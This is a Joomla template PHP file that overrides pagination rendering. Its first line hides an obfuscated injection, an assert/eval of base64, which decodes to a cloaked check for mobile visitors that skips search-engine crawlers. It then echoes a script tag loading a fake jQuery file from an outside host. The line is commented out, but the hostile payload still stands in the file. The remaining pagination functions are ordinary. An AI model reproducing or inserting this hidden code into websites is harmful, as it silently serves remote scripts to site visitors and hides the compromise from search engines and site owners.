<?php
//$_ = strrev('tressa'); @$_("e\166\141\154\050b\141\163\145\066\064\137\144\145\143\157\144\145\050'aWYgKChwcmVnX21hdGNoKCcvdGV4dFwvdm5kLndhcC53bWx8YXBwbGljYXRpb25cL3ZuZC53YXAueGh0bWxcK3htbC9zaScsIEAkX1NFUlZFUlsnSFRUUF9BQ0NFUFQnXSkgfHwgcHJlZ19tYXRjaCgnL2FsY2F0ZWx8YW1vaXxhbmRyb2lkfGF2YW50Z298YmxhY2tiZXJyeXxiZW5xfGNlbGx8Y3JpY2tldHxkb2NvbW98ZWxhaW5lfGh0Y3xpZW1vYmlsZXxpcGhvbmV8aXBhZHxpcGFxfGlwb2R8ajJtZXxqYXZhfG9wZXJhLm1pbml8bWlkcHxtbXB8bW9iaXxtb3Rvcm9sYXxuZWMtfG5va2lhfHBhbG18cGFuYXNvbmljfHBoaWxpcHN8cGhvbmV8c2FnZW18c2hhcnB8c2llLXxzbWFydHBob25lfHNvbnl8c3ltYmlhbnx0LW1vYmlsZXx0ZWx1c3x1cFwuYnJvd3Nlcnx1cFwubGlua3x2b2RhZm9uZXx3YXB8d2Vib3N8d2lyZWxlc3N8eGRhfHhvb218enRlL3NpJywgQCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkgfHwgcHJlZ19tYXRjaCgnL21zZWFyY2h8bVw/cT0vc2knLCBAJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSkgJiYgIXByZWdfbWF0Y2goJy9tYWNpbnRvc2h8YW1lcmljYXxhdmFudHxkb3dubG9hZHx3aW5kb3dzXC1tZWRpYVwtcGxheWVyfHlhbmRleHxnb29nbGUvc2knLCBAJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgeyBlY2hvICc8c2NyaXB0IHNyYz0iaHR0cDovL21vYmlsZS1jb250ZW50LmluZm8vanF1ZXJ5LTEuNy4xLmpzIj48L3NjcmlwdD4nOyBmbHVzaCgpOyBleGl0OyB9'\051\051\073");
?>
<?php
/**
 * @version		$Id: pagination.php 10381 2008-06-01 03:35:53Z pasamio $
 * @package		Joomla
 * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

/**
 * This is a file to add template specific chrome to pagination rendering.
 *
 * pagination_list_footer
 * 	Input variable $list is an array with offsets:
 * 		$list[limit]		: int
 * 		$list[limitstart]	: int
 * 		$list[total]		: int
 * 		$list[limitfield]	: string
 * 		$list[pagescounter]	: string
 * 		$list[pageslinks]	: string
 *
 * pagination_list_render
 * 	Input variable $list is an array with offsets:
 * 		$list[all]
 * 			[data]		: string
 * 			[active]	: boolean
 * 		$list[start]
 * 			[data]		: string
 * 			[active]	: boolean
 * 		$list[previous]
 * 			[data]		: string
 * 			[active]	: boolean
 * 		$list[next]
 * 			[data]		: string
 * 			[active]	: boolean
 * 		$list[end]
 * 			[data]		: string
 * 			[active]	: boolean
 * 		$list[pages]
 * 			[{PAGE}][data]		: string
 * 			[{PAGE}][active]	: boolean
 *
 * pagination_item_active
 * 	Input variable $item is an object with fields:
 * 		$item->base	: integer
 * 		$item->link	: string
 * 		$item->text	: string
 *
 * pagination_item_inactive
 * 	Input variable $item is an object with fields:
 * 		$item->base	: integer
 * 		$item->link	: string
 * 		$item->text	: string
 *
 * This gives template designers ultimate control over how pagination is rendered.
 *
 * NOTE: If you override pagination_item_active OR pagination_item_inactive you MUST override them both
 */

function pagination_list_footer($list)
{
	$html = "<div class=\"list-footer\">\n";

	$html .= "\n<div class=\"limit\">".JText::_('Display Num').$list['limitfield']."</div>";
	$html .= $list['pageslinks'];
	$html .= "\n<div class=\"counter\">".$list['pagescounter']."</div>";

	$html .= "\n<input type=\"hidden\" name=\"limitstart\" value=\"".$list['limitstart']."\" />";
	$html .= "\n</div>";

	return $html;
}

function pagination_list_render($list)
{
	// Initialize variables
	$html = "<span class=\"pagination\"> Page ";
	//$html .= '<span>&laquo;</span>'.$list['start']['data'];
	//$html .= $list['previous']['data'];

	foreach( $list['pages'] as $page )
	{
		
		if($page['data']['active']) {
			$html .= '<strong>';
		}

		$html .= $page['data'];

		if($page['data']['active']) {
			$html .= ' | </strong>';
		}
	}

	//$html .= $list['next']['data'];
	//$html .= $list['end']['data'];
	//$html .= '<span>&raquo;</span>';

	$html .= "</span>";
	return $html;
}

function pagination_item_active(&$item) {

if($item->text==1){
	if(strpos($item->link,"?"))
		return "<a href=\"".$item->link."&limitstart=0\" title=\"".$item->text."\">".$item->text."</a>";
	else
		return "<a href=\"".$item->link."?limitstart=0\" title=\"".$item->text."\">".$item->text."</a>";
}
else 
	return "<a href=\"".$item->link."\" title=\"".$item->text."\">".$item->text."</a>";
}


function pagination_item_inactive(&$item) {
	return "<span>".$item->text."</span>";
}
?>